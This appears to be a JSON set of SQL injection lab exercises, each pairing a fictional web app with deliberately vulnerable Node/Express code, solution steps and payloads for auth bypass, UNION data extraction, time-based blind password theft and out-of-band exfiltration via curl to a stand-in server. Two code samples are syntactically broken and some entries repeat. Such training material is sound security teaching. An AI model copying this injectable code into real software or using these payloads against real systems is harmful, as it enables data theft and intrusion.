    "Lab Description": "The real estate portal has a search functionality for filtering property listings based on price and location. The search is vulnerable to SQL Injection, which allows attackers to extract property information, including addresses and prices.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the property search request using Burp Suite to identify vulnerable parameters (price, location).",
      "Inject SQL payloads like ' UNION SELECT address, price, type FROM properties -- to extract property details.",
      "Use UNION SELECT to retrieve details of multiple properties.",
      "Verify successful extraction of property information from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-properties', (req, res) => {\n  const { price, location } = req.query;\n  const sql = `SELECT * FROM properties WHERE price <= '${price}' AND location = '${location}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error searching properties');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT address, price, type FROM properties --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Student Portal - SQL Injection in Course Registration",
    "Lab Description": "The student portal contains a course registration page that is vulnerable to SQL Injection. An attacker can inject SQL payloads into the student ID field to manipulate course registrations and extract sensitive student data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the course registration request using Burp Suite to identify vulnerable parameters (student_id).",
      "Inject SQL payloads like ' UNION SELECT student_name, course_name, registration_date FROM registrations -- to extract student registration data.",
      "Use UNION SELECT to manipulate course registration information.",
      "Verify successful extraction or modification of course registration data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/register-course', (req, res) => {\n  const { student_id, course_id } = req.body;\n  const sql = `INSERT INTO registrations (student_id, course_id) VALUES ('${student_id}', '${course_id}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error registering for course');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT student_name, course_name, registration_date FROM registrations --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Admin Dashboard - SQL Injection in Admin Login",
    "Lab Description": "The admin dashboard's login page is vulnerable to SQL Injection. An attacker can inject SQL payloads into the username and password fields to bypass authentication and gain access to the admin interface.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the admin login request using Burp Suite to identify vulnerable parameters (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication.",
      "Test various payloads to successfully log in as an admin user.",
      "Verify successful login with unauthorized admin access."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/admin-login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM admins WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error logging in');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a' --"
    ]
  },
  {
    "Lab scenario": "Online Shopping Cart - SQL Injection in Cart Checkout",
    "Lab Description": "The online shopping cart system is vulnerable to SQL Injection during checkout. An attacker can inject SQL payloads into the checkout form to extract payment details or modify order information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the checkout request using Burp Suite to identify vulnerable parameters (cart_id, payment_info).",
      "Inject SQL payloads like ' UNION SELECT cart_id, product_name, price FROM cart_items -- to extract cart details.",
      "Use UNION SELECT to manipulate the checkout process or retrieve payment information.",
      "Verify successful extraction or modification of cart details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/checkout', (req, res) => {\n  const { cart_id, payment_info } = req.body;\n  const sql = `SELECT * FROM cart WHERE cart_id = '${cart_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error processing checkout');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT cart_id, product_name, price FROM cart_items --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Music Streaming Service - SQL Injection in Playlist Creation",
    "Lab Description": "The music streaming service's playlist creation form is vulnerable to SQL Injection. Attackers can inject SQL payloads to modify existing playlists or extract sensitive data such as user information and playlist details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the playlist creation request using Burp Suite to identify vulnerable parameters (playlist_name, user_id).",
      "Inject SQL payloads like ' UNION SELECT username, playlist_name, track_count FROM playlists -- to extract playlist details.",
      "Use UNION SELECT to modify playlist data or manipulate user information.",
      "Verify successful data extraction or modification of playlist."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/create-playlist', (req, res) => {\n  const { playlist_name, user_id } = req.body;\n  const sql = `INSERT INTO playlists (user_id, playlist_name) VALUES ('${user_id}', '${playlist_name}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error creating playlist');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, playlist_name, track_count FROM playlists --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Library Management System - SQL Injection in Book Search",
    "Lab Description": "The library management system's book search functionality is vulnerable to SQL Injection. An attacker can inject SQL payloads into the search query to extract book details, including author information and publication dates.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the book search request using Burp Suite to identify vulnerable parameters (search_term).",
      "Inject SQL payloads like ' UNION SELECT book_title, author, publication_date FROM books -- to extract book details.",
      "Use UNION SELECT to retrieve details of multiple books.",
      "Verify successful extraction of book data from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-books', (req, res) => {\n  const { search_term } = req.query;\n  const sql = `SELECT * FROM books WHERE book_title LIKE '%${search_term}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error searching books');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT book_title, author, publication_date FROM books --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Inventory Management System - SQL Injection in Item Search",
    "Lab Description": "The inventory management system has a vulnerable item search feature. An attacker can inject SQL payloads into the item search field to retrieve sensitive inventory data, such as item prices, quantities, and supplier information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the item search request using Burp Suite to identify vulnerable parameters (search_query).",
      "Inject SQL payloads like ' UNION SELECT item_name, price, quantity, supplier FROM inventory -- to extract inventory data.",
      "Use UNION SELECT to retrieve sensitive details of multiple items.",
      "Verify successful extraction of inventory data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-items', (req, res) => {\n  const { search_query } = req.query;\n  const sql = `SELECT * FROM inventory WHERE item_name LIKE '%${search_query}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error searching items');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT item_name, price, quantity, supplier FROM inventory --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Employee Portal - SQL Injection in Salary Query",
    "Lab Description": "The employee portal allows employees to query their salary details. This query is vulnerable to SQL Injection, which allows attackers to extract salary data for all employees and potentially alter sensitive financial records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the salary query request using Burp Suite to identify vulnerable parameters (employee_id).",
      "Inject SQL payloads like ' UNION SELECT employee_name, salary, department FROM employees -- to extract salary and employee information.",
      "Use time-based SQL injection to confirm the presence of the data.",
      "Verify successful extraction or manipulation of employee salary data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/salary-details', (req, res) => {\n  const { employee_id } = req.query;\n  const sql = `SELECT * FROM employees WHERE employee_id = '${employee_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error fetching salary details');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT employee_name, salary, department FROM employees --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Job Portal - SQL Injection in Job Application",
    "Lab Description": "The job portal allows users to apply for jobs by submitting their resumes. The job application form is vulnerable to SQL Injection, allowing an attacker to retrieve job applicant data, including resumes, personal information, and job preferences.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the job application request using Burp Suite to identify vulnerable parameters (job_id, applicant_id).",
      "Inject SQL payloads like ' UNION SELECT applicant_name, resume, job_position FROM job_applications -- to extract applicant data.",
      "Use UNION SELECT to retrieve multiple applicants' data.",
      "Verify successful extraction of job application information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/apply-job', (req, res) => {\n  const { job_id, applicant_id, resume } = req.body;\n  const sql = `INSERT INTO job_applications (job_id, applicant_id, resume) VALUES ('${job_id}', '${applicant_id}', '${resume}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error applying for job');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT applicant_name, resume, job_position FROM job_applications --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Healthcare System - SQL Injection in Patient Record Search",
    "Lab Description": "The healthcare system's patient record search feature is vulnerable to SQL Injection. An attacker can extract sensitive patient information, including medical history, diagnosis, and treatment records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the patient record search request using Burp Suite to identify vulnerable parameters (patient_id).",
      "Inject SQL payloads like ' UNION SELECT patient_name, diagnosis, treatment FROM patient_records -- to extract medical details.",
      "Use out-of-band SQL injection to confirm the presence of the data.",
      "Verify successful extraction of sensitive patient data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/patient-records', (req, res) => {\n  const { patient_id } = req.query;\n  const sql = `SELECT * FROM patient_records WHERE patient_id = '${patient_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving patient records');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT patient_name, diagnosis, treatment FROM patient_records --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Customer Support Portal - SQL Injection in Ticket Management",
    "Lab Description": "The customer support portal allows users to submit tickets for technical support. The ticket management system is vulnerable to SQL Injection, which can be exploited to extract sensitive support tickets or modify ticket statuses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the ticket submission request using Burp Suite to identify vulnerable parameters (ticket_id, customer_id).",
      "Inject SQL payloads like ' UNION SELECT ticket_title, issue_description, status FROM support_tickets -- to extract support ticket data.",
      "Use time-based SQL injection to confirm the presence of the data.",
      "Verify successful extraction or manipulation of support ticket data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/submit-ticket', (req, res) => {\n  const { ticket_id, customer_id, description } = req.body;\n  const sql = `INSERT INTO support_tickets (ticket_id, customer_id, description) VALUES ('${ticket_id}', '${customer_id}', '${description}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error submitting ticket');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT ticket_title, issue_description, status FROM support_tickets --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Hotel Reservation System - SQL Injection in Room Availability Check",
    "Lab Description": "The hotel reservation system is vulnerable to SQL Injection in the room availability check. An attacker can manipulate the query to extract information on available rooms, their prices, and booking details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the room availability check request using Burp Suite to identify vulnerable parameters (room_type, date).",
      "Inject SQL payloads like ' UNION SELECT room_type, price, available_dates FROM rooms -- to extract room details.",
      "Use UNION SELECT to retrieve multiple room availability records.",
      "Verify successful extraction of room information from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/check-availability', (req, res) => {\n  const { room_type, date } = req.query;\n  const sql = `SELECT * FROM rooms WHERE room_type = '${room_type}' AND available_date = '${date}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error checking availability');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT room_type, price, available_dates FROM rooms --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Event Management System - SQL Injection in Event Registration",
    "Lab Description": "The event management system's registration form is vulnerable to SQL Injection. An attacker can use SQL injection to manipulate registration details and extract attendee information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the event registration request using Burp Suite to identify vulnerable parameters (event_id, attendee_id).",
      "Inject SQL payloads like ' UNION SELECT attendee_name, event_name, registration_status FROM event_registrations -- to extract attendee data.",
      "Use UNION SELECT to retrieve multiple event registration records.",
      "Verify successful extraction or modification of event registration data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/register-event', (req, res) => {\n  const { event_id, attendee_id, registration_status } = req.body;\n  const sql = `INSERT INTO event_registrations (event_id, attendee_id, registration_status) VALUES ('${event_id}', '${attendee_id}', '${registration_status}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error registering for event');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT attendee_name, event_name, registration_status FROM event_registrations --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Auction System - SQL Injection in Bid Submission",
    "Lab Description": "The online auction system is vulnerable to SQL Injection in the bid submission form. An attacker can inject SQL payloads to retrieve auction details such as highest bid, bidder details, and item information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the bid submission request using Burp Suite to identify vulnerable parameters (auction_id, bid_amount).",
      "Inject SQL payloads like ' UNION SELECT item_name, highest_bid, bidder_id FROM auction_items -- to extract auction data.",
      "Use time-based SQL injection to confirm the presence of data.",
      "Verify successful extraction or manipulation of auction details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/submit-bid', (req, res) => {\n  const { auction_id, bid_amount } = req.body;\n  const sql = `INSERT INTO bids (auction_id, bid_amount) VALUES ('${auction_id}', '${bid_amount}')`; \n  db.query(sql, (err, result) => {\n    if (err)res.status(500).send('Error submitting bid');\n else res.json({ success: true });\n });\n});",
    "payloads": [
      "' UNION SELECT item_name, highest_bid, bidder_id FROM auction_items --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "E-commerce Admin Portal - SQL Injection in Order Management",
    "Lab Description": "The e-commerce platform's admin portal is vulnerable to SQL Injection when managing customer orders. An attacker who compromises an admin account could extract or modify customer order histories, payment statuses, and shipping details.",
    "Difficulty Level": "Very Hard",
    "Solution Steps": [
      "Login as an admin (or hijack a session) and intercept the order management requests.",
      "Identify vulnerable parameters (order_id, customer_id).",
      "Inject SQL payloads like ' UNION SELECT customer_name, order_total, shipping_address FROM orders -- to extract sensitive data.",
      "Verify extraction of order histories or manipulation of order records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/manage-orders', (req, res) => {\n const { order_id } = req.query;\n const sql = SELECT * FROM orders WHERE order_id = '${order_id}'; \n db.query(sql, (err, result) => {\n if (err) res.status(500).send('Error retrieving order');\n else res.json(result);\n });\n});",
    "payloads": [
      "' UNION SELECT customer_name, order_total, shipping_address FROM orders --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Management Platform - SQL Injection in Device Configuration",
    "Lab Description": "The IoT platform for device management has a vulnerable configuration upload feature that accepts SQL queries without proper sanitization. Attackers could extract device configurations, firmware versions, and private device keys.",
    "Difficulty Level": "Very Hard",
    "Solution Steps": [
      "Intercept the configuration upload request using Burp Suite to find vulnerable parameters (device_id, config_name).",
      "Inject payloads like ' UNION SELECT device_id, firmware_version, private_key FROM device_configs --.",
      "Use time-based SQL injection techniques to extract private device keys.",
      "Confirm unauthorized access to confidential IoT device configurations."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/upload-config', (req, res) => {\n const { device_id, config_name } = req.body;\n const sql = INSERT INTO device_configs (device_id, config_name) VALUES ('${device_id}', '${config_name}'); \n db.query(sql, (err, result) => {\n if (err) res.status(500).send('Error uploading config');\n else res.json({ success: true });\n });\n});",
    "payloads": [
      "' UNION SELECT device_id, firmware_version, private_key FROM device_configs --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal - SQL Injection in Patient Record Search",
    "Lab Description": "A healthcare portal allows searching patient records by name. The search functionality is vulnerable to SQL Injection, risking exposure of confidential medical records and insurance information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the patient search feature and monitor requests.",
      "Inject SQL payloads in the 'patient_name' parameter to retrieve all records.",
      "Use UNION-based SQL injection to extract patient medical histories.",
      "Confirm unauthorized access to sensitive healthcare data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-patient', (req, res) => {\n  const { patient_name } = req.query;\n  const sql = `SELECT * FROM patients WHERE name LIKE '%${patient_name}%'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT name, insurance_number, diagnosis FROM patients --",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "Online Travel Booking - SQL Injection in Flight Search",
    "Lab Description": "The flight search functionality in an online travel booking system is vulnerable to SQL Injection, exposing flight reservation details and traveler profiles.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Perform a flight search and intercept the request.",
      "Inject payloads into the 'destination' or 'origin' fields.",
      "Leverage UNION-based SQL injection to enumerate traveler profiles.",
      "Extract booking IDs and customer information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-flight', (req, res) => {\n  const { destination } = req.query;\n  const sql = `SELECT * FROM flights WHERE destination = '${destination}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Flight search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT flight_number, passenger_name, seat FROM flights --",
      "' OR '1'='1' --"
    ]
  },
  {
    "Lab scenario": "CMS Platform - SQL Injection in Article Management",
    "Lab Description": "The CMS article editing feature does not sanitize input properly, allowing an attacker to exploit SQL Injection to modify or delete content.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Login as a low-privileged user and edit an article.",
      "Inject payloads into the 'article_id' or 'title' fields.",
      "Perform UNION SQL injection to escalate privileges or modify database entries."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/edit-article', (req, res) => {\n  const { article_id, title } = req.body;\n  const sql = `UPDATE articles SET title = '${title}' WHERE id = '${article_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking App - SQL Injection in Account Balance Retrieval",
    "Lab Description": "The online banking app allows users to retrieve their account balance but lacks input sanitization, enabling attackers to view other customers’ account information.",
    "Difficulty Level": "Very Hard",
    "Solution Steps": [
      "Capture the balance retrieval API call.",
      "Inject SQL payloads into the 'account_id' parameter.",
      "Use boolean-based SQL injection techniques to confirm unauthorized data access."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { account_id } = req.query;\n  const sql = `SELECT balance FROM accounts WHERE account_id = '${account_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance retrieval error');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT user_id, balance, account_type FROM accounts --"
    ]
  },
  {
    "Lab scenario": "Online Marketplace - SQL Injection in Category Filter",
    "Lab Description": "An online marketplace's category filter does not properly validate input, making it susceptible to SQL Injection, leading to exposure of all products and users’ personal details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use category filters and inspect the requests.",
      "Inject payloads into the 'category' parameter to access restricted product information.",
      "Confirm data leak via extracted product lists and seller information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/filter-products', (req, res) => {\n  const { category } = req.query;\n  const sql = `SELECT * FROM products WHERE category = '${category}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Filtering error');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT name, price, description FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Hotel Reservation System - SQL Injection in Booking Lookup",
    "Lab Description": "The hotel reservation system allows users to check booking status by ID, but the lookup feature is vulnerable to SQL Injection, risking customer booking records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a booking lookup request and tamper with the 'booking_id' field.",
      "Inject SQL payloads to retrieve all booking records.",
      "Confirm exposure of customer names, stay dates, and payment statuses."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/lookup-booking', (req, res) => {\n  const { booking_id } = req.query;\n  const sql = `SELECT * FROM bookings WHERE booking_id = '${booking_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Lookup failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT guest_name, checkin_date, checkout_date FROM bookings --",
      "' OR '1'='1' --"
    ]
  },
  {
    "Lab scenario": "Educational Platform - SQL Injection in Exam Result Checker",
    "Lab Description": "An education portal’s exam result checker lacks input validation, enabling an attacker to perform SQL Injection to retrieve students' scores and grades.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use the exam result checker and monitor traffic.",
      "Inject SQL payloads into the 'student_id' parameter.",
      "Extract student names and grades via UNION-based SQL injection."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/check-result', (req, res) => {\n  const { student_id } = req.query;\n  const sql = `SELECT * FROM exam_results WHERE student_id = '${student_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Result checking failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT student_name, subject, score FROM exam_results --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Inventory Management System - SQL Injection in Item Update",
    "Lab Description": "The inventory update feature does not properly sanitize user inputs, allowing SQL Injection to manipulate product inventory and pricing data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept inventory update requests.",
      "Inject payloads into the 'item_id' or 'new_price' fields.",
      "Leverage SQL Injection to update unauthorized inventory entries."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-inventory', (req, res) => {\n  const { item_id, new_price } = req.body;\n  const sql = `UPDATE inventory SET price = '${new_price}' WHERE id = '${item_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; UPDATE inventory SET stock = 9999 WHERE id = '1",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Charity Donation Platform - SQL Injection in Donation History",
    "Lab Description": "The donation history page is vulnerable to SQL Injection, allowing attackers to view donor personal information and donation amounts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the donation history lookup.",
      "Inject payloads into the 'donor_id' parameter.",
      "Confirm leakage of donor names and donation records via SQL injection."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/donation-history', (req, res) => {\n  const { donor_id } = req.query;\n  const sql = `SELECT * FROM donations WHERE donor_id = '${donor_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error fetching donation history');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT donor_name, amount, date FROM donations --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Food Delivery App - SQL Injection in Order Tracking",
    "Lab Description": "Order tracking by order ID in a food delivery application is vulnerable to SQL Injection, allowing exposure of customer addresses and order details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Track an order and intercept the order tracking request.",
      "Inject payloads into the 'order_id' parameter.",
      "Extract full customer orders using SQL injection techniques."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/track-order', (req, res) => {\n  const { order_id } = req.query;\n  const sql = `SELECT * FROM orders WHERE order_id = '${order_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Tracking failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT customer_name, address, order_total FROM orders --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Food Delivery App - SQL Injection in Order Tracking",
    "Lab Description": "Order tracking by order ID in a food delivery application is vulnerable to SQL Injection, allowing exposure of customer addresses and order details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Track an order and intercept the order tracking request.",
      "Inject payloads into the 'order_id' parameter.",
      "Extract full customer orders using SQL Injection.",
      "Confirm leakage of address, order contents, and payment details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/track-order', (req, res) => {\n  const { order_id } = req.query;\n  const sql = `SELECT * FROM orders WHERE order_id = '${order_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Order tracking failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT customer_name, address, payment_status FROM orders --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Time-Based SQL Injection in Transaction History",
    "Lab Description": "Transaction history lookup uses raw SQL queries based on the account number without sanitization. The application delays response timing based on injected SQL sleep commands, allowing attackers to infer database contents using blind methods. To solve: extract admin account credentials using time-based SQLi inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept transaction lookup requests.",
      "Inject time-based payloads into the 'account_id' parameter and monitor delays.",
      "Craft nested sleep() queries to retrieve username characters.",
      "Automate using sqlmap with '--technique=T' mode.",
      "Verify by logging in using extracted credentials."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/history', (req, res) => {\n  const { account_id } = req.query;\n  db.query(`SELECT * FROM transactions WHERE account_id = '${account_id}'`, (err, data) => {\n    if (err) res.status(500).send('Error');\n    else res.json(data);\n  });\n});",
    "payloads": [
      "' OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a',SLEEP(5),0) -- ",
      "'||(SELECT IF(ASCII(SUBSTRING((SELECT password FROM users WHERE role='admin'),1,1))>77,SLEEP(3),0))||'"
    ]
  },
  {
    "Lab scenario": "IoT Management Dashboard - UNION SQL Injection in Device Search",
    "Lab Description": "A device search function concatenates user input into a SQL ORDER BY clause without validation, leading to UNION-based SQL Injection. Attackers can enumerate all device passwords. To solve: retrieve admin IoT credentials through crafted UNION payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to capture the search request to '/devices'.",
      "Test basic SQLi payloads like 'ORDER BY 1--'.",
      "Inject a UNION payload to fetch device usernames and passwords.",
      "Extract sensitive admin IoT device credentials.",
      "Log in as an administrator into the IoT dashboard."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/devices', (req, res) => {\n  const { sortBy } = req.query;\n  db.query(`SELECT * FROM devices ORDER BY ${sortBy}`, (err, devices) => {\n    if (err) res.status(500).send('Sort Error');\n    else res.json(devices);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username,password FROM devices -- ",
      "name UNION ALL SELECT NULL,password FROM users --"
    ]
  },
  {
    "Lab scenario": "Bank API Gateway - Out-of-Band SQL Injection in Payment Initiation",
    "Lab Description": "The bank API for initiating payments is vulnerable to Out-of-Band (OOB) SQL Injection by mishandling 'reference_id'. Attackers can trigger DNS callbacks or HTTP exfiltration channels. To solve: perform successful OOB data exfiltration via Burp Collaborator.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite Collaborator to prepare a payload domain.",
      "Submit crafted reference_id payloads that perform OOB lookups.",
      "Trigger exfiltration using OOB SQLi with dns/HTTP requests.",
      "Capture leaked session tokens or credentials on the Collaborator server.",
      "Use the leaked data to impersonate a payment session."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/pay', (req, res) => {\n  const { reference_id } = req.body;\n  db.query(`INSERT INTO payments (reference_id) VALUES ('${reference_id}')`, (err) => {\n    if (err) res.status(500).send('Payment Failed');\n    else res.send('Payment initiated');\n  });\n});",
    "payloads": [
      "'; exec master..xp_dirtree '//your-collaborator.com/a' --",
      "'; SELECT load_file('\\\\your-collaborator.com\\payload') --",
      "'; COPY (SELECT current_user) TO PROGRAM 'curl http://your-server.com/?user='||current_user --"
    ]
  },
  {
    "Lab scenario": "CMS Admin Panel - Boolean-Based SQL Injection in User Role Verification",
    "Lab Description": "The CMS checks administrative roles based on unsafe SQL queries using user_id parameters without sanitization. Boolean-based conditions allow attackers to infer admin roles by observing response differences. To solve: enumerate admin accounts through Boolean-based inference.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send crafted POST requests with modified 'user_id'.",
      "Observe responses for true/false behaviors based on injected boolean expressions.",
      "Use binary search to infer admin account IDs.",
      "Manually craft payloads or automate using sqlmap '--technique=B'.",
      "Login as admin with identified credentials."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/verify-role', (req, res) => {\n  const { user_id } = req.body;\n  db.query(`SELECT * FROM roles WHERE user_id = '${user_id}' AND role='admin'`, (err, result) => {\n    if (err) res.status(500).send('Error');\n    else res.json({ valid: result.length > 0 });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 1=0 --",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Error-Based SQL Injection in User Profile Update",
    "Lab Description": "Profile update functionality includes SQL error details when invalid input is submitted. Attackers can exploit verbose error messages to extract database structure using error-based SQL Injection. To solve: leak table names and user data using crafted payloads.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept profile update requests via Burp Suite.",
      "Submit invalid inputs and observe database errors.",
      "Inject payloads triggering SQL errors (division by zero, syntax errors).",
      "Analyze leaked error messages to retrieve database schema.",
      "Use retrieved table names to extract user information."
    ],
    "Vulnerability name": "SQL Injection",
